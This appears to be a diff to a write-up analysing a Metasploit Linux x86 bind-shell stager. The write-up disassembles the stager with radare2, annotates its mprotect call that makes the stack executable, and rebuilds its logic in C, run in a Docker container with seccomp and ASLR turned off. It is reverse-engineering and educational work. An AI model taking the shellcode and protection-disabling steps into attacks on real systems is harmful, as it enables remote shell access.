@@ -11,12 +11,12 @@ msf5 payload(linux/x86/shell/bind_tcp) > generate -f raw -o stage1.bin
 $ r2 -a x86 -b 32 -c 'pd' stage1.bin
             0x00000000      6a7d           push 0x7d           ; syscall #125: int mprotect(void *addr, size_t len, int prot);
             0x00000002      58             pop eax
-            0x00000003      99             cdq
+            0x00000003      99             cdq                 ; edx = 0
             0x00000004      b207           mov dl, 7           ; prot = PROT_READ(0x04) | PROT_WRITE(0x02) | PROT_EXEC(0x01)
             0x00000006      b900100000     mov ecx, 0x1000     ; len = 4096
             0x0000000b      89e3           mov ebx, esp        ;
-            0x0000000d      6681e300f0     and bx, 0xf000      ; addr = esp & 0xf000
-            0x00000012      cd80           int 0x80        !!! ; mprotect(esp&0xf000, 4096, PROT_READ|PROT_WRITE|PROT_EXEC)
+            0x0000000d      6681e300f0     and bx, 0xf000      ; addr = esp & 0xfffff000
+            0x00000012      cd80           int 0x80        !!! ; mprotect(esp&0xfffff000, 4096, PROT_READ|PROT_WRITE|PROT_EXEC)
 
             0x00000014      31db           xor ebx, ebx        ; ebx = 0
             0x00000016      f7e3           mul ebx             ; eax = 0, edx = 0
@@ -86,6 +86,8 @@ $ r2 -a x86 -b 32 -c 'pd' stage1.bin
 ## Reconstructing with C Code:
 
 ```c
+#include <stdint.h>
+#include <sys/mman.h>
 #include <stdio.h>
 #include <error.h>
 #include <sys/types.h>
@@ -93,9 +95,13 @@ $ r2 -a x86 -b 32 -c 'pd' stage1.bin
 #include <netinet/in.h>
 
 int main(int argc, char* argv[]) {
+        uint32_t esp;
         int sockfd;
         int val = 4;
         int result;
+
+        asm("mov %%esp, %0" : "=r" (esp));
+        mprotect(esp&0xfffff000, 4096, PROT_READ|PROT_WRITE|PROT_EXEC);
 
         sockfd = socket(AF_INET, SOCK_STREAM, 0);
         printf("socket():\t0x%08x\n", sockfd);
@@ -115,6 +121,7 @@ int main(int argc, char* argv[]) {
 # docker run -it --rm --name deleteme -v /tmp/shared:/shared --cap-add=SYS_PTRACE --security-opt seccomp=unconfined -p2000:2000 ubuntu
 root@51d604030a59:/# apt install -y build-essential libc6-i386 gcc-multilib
 root@51d604030a59:/# gcc -m32 test.c -o test
+root@51d604030a59:/# setarch `uname -m` -R /shared/test
 ```
 
 ## References
